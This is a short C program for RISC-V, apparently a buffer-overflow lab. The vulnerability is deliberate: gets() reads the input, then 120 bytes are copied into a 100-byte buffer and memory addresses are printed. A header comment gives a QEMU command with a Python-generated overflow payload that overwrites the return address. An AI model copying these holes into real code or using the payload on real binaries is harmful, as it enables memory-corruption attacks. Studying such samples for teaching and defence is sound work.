//$QEMU64 -g 1234 -L $RISCV/sysroot vuln1.exe "$(python -c 'print "A"*0x6c + "BBBB" + "\x1c\xdd\x02"')"

// 0x6c buffersize + 1 byte
// old SP addr BBBB ( random old SP value)
// not_called addr: 0x10138 ( will most probably change )
// compile -> riscv64-unknown-linux-gnu-gcc -static -g -o vuln2 vuln2.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//char *input;
char* hacked = "Hacked!!!";
//char* hellostring = " Hello World ";
void vulnerable_function(char* string) {
    char buffer[100];
    printf ("buffer: %p \n", &buffer);	
    memcpy(buffer, string,120);
}

int main(int argc, char** argv) {
    printf("Main function!\n");
    
//Print addresses not to use gdb
    printf ("hacked: %p \n", hacked);
    size_t i;  
    void (*ptr_to_puts)() = puts;
    for (i=0; i<sizeof ptr_to_puts; i++)
    printf("%.2x", ((unsigned char *)&ptr_to_puts)[i]);
    putchar('\n');


//End of addresses
    char *input=(char*)malloc(120); 
    gets(input);
//    printf("%s\n",input+2);
    vulnerable_function(input);

    return 0;
}
